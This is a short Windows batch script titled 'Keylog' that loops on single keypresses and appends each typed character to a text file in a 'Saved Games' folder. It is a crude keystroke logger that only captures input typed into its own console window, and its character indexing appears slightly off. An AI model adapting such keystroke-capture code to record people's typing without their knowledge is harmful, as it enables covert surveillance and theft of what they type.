@echo off
setlocal EnableDelayedExpansion
color 0a
title Keylog
set "chars= qwertyuiopasdfghjklzxcvbnm1234567890"
:start
cls
choice /c %chars% >nul
>> C:\Users\Admin\Saved Games\kblog.txt echo !chars:~%errorlevel%,1!
goto start